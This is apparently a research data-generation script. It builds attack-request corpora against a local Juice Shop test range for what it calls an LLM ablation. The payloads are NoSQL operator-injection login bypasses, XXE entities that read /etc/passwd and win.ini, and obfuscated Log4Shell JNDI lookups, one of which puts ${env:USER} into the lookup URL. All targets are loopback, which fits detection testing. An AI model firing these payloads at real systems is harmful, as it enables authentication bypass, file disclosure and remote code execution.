"""Generate the novel-campaign data files used by the LLM ablation.

Each file is {dossier, requests}. These are standard, published detection probes
for attack classes that the template deliberator has no template for, aimed only
at our own local Juice Shop range. Loopback targets only.

    python data/make_novel_campaigns.py
"""

import json
import urllib.parse
from pathlib import Path

OUT = Path(__file__).resolve().parent / "attack_corpus"


def q(path, value, key="q"):
    return {"method": "GET", "uri": f"{path}?{key}=" + urllib.parse.quote(value, safe=""),
            "body": "", "malicious": True}


def post(path, body, ct="application/json"):
    b = body if isinstance(body, str) else json.dumps(body)
    return {"method": "POST", "uri": path, "body": b, "content_type": ct, "malicious": True}


def write(name, comment, endpoints, requests):
    d = {"_comment": comment + " Local range only.",
         "dossier": {"techniques": ["other"], "attack_class": "other", "endpoints": endpoints},
         "requests": requests}
    (OUT / f"novel_{name}.json").write_text(json.dumps(d, indent=2), encoding="utf-8")
    print(f"novel_{name}.json: {len(requests)} requests")


# NoSQL-style operator injection (Mongo-like operators as JSON values / bracket params)
nosql = []
for body in [{"email": {"$ne": None}, "password": {"$ne": None}},
             {"email": {"$gt": ""}, "password": {"$gt": ""}},
             {"email": {"$regex": ".*"}, "password": "x"},
             {"email": "admin@juice-sh.op", "password": {"$ne": "x"}},
             {"email": {"$or": [{"a": 1}, {"b": 2}]}, "password": "x"},
             {"email": {"$where": "1==1"}, "password": "x"}]:
    nosql.append(post("/rest/user/login", body))
for v in ["x[$ne]=1", "x[$gt]=", "x[$regex]=.*", "x[$where]=1"]:
    nosql.append({"method": "GET", "uri": "/rest/products/search?q=" + urllib.parse.quote(v, safe="="),
                  "body": "", "malicious": True})
write("nosqli", "NoSQL operator-injection probes.", ["/rest/user/login", "/rest/products/search"], nosql)

# XML external entity probes
xxe = []
for ent in ['<!ENTITY xxe SYSTEM "file:///etc/passwd">', '<!ENTITY xxe SYSTEM "http://127.0.0.1:3000/">',
            '<!ENTITY % p SYSTEM "http://127.0.0.1:9/e.dtd"> %p;',
            '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">']:
    xxe.append(post("/api/Feedbacks/",
                    f'<?xml version="1.0"?><!DOCTYPE foo [{ent}]><foo>&xxe;</foo>', "application/xml"))
    xxe.append(post("/api/Feedbacks/",
                    f'<?xml version="1.0"?><!DOCTYPE r [{ent}]><comment>&xxe;</comment>', "text/xml"))
for v in ['<!DOCTYPE x [<!ENTITY a "b">]>', '<?xml version="1.0"?><!DOCTYPE z SYSTEM "http://127.0.0.1/x.dtd">',
          '<!ENTITY lol "lol">', '<!DOCTYPE d [<!ENTITY e SYSTEM "file:///etc/hostname">]>']:
    xxe.append(q("/rest/products/search", v))
write("xxe", "XML external entity probes.", ["/api/Feedbacks/", "/rest/products/search"], xxe)

# JNDI / Log4Shell-style lookup probes (loopback, defanged targets)
jndi = []
for v in ["${jndi:ldap://127.0.0.1:1389/a}", "${jndi:rmi://127.0.0.1:1099/a}",
          "${${lower:j}ndi:ldap://127.0.0.1/a}", "${jndi:dns://127.0.0.1/a}",
          "${${::-j}${::-n}${::-d}${::-i}:ldap://127.0.0.1/a}", "${jndi:ldap://localhost:1389/x}"]:
    jndi.append(q("/rest/products/search", v))
for v in ["${jndi:ldap://127.0.0.1:1389/a}", "${jndi:rmi://127.0.0.1:1099/b}",
          "${${lower:j}ndi:ldap://127.0.0.1/c}", "${env:USER}", "${sys:java.version}",
          "${jndi:ldap://127.0.0.1/${env:USER}}"]:
    jndi.append(post("/api/Feedbacks/", {"comment": "nice " + v, "rating": 3}))
write("jndi", "JNDI / Log4Shell-style lookup probes.", ["/rest/products/search", "/api/Feedbacks/"], jndi)
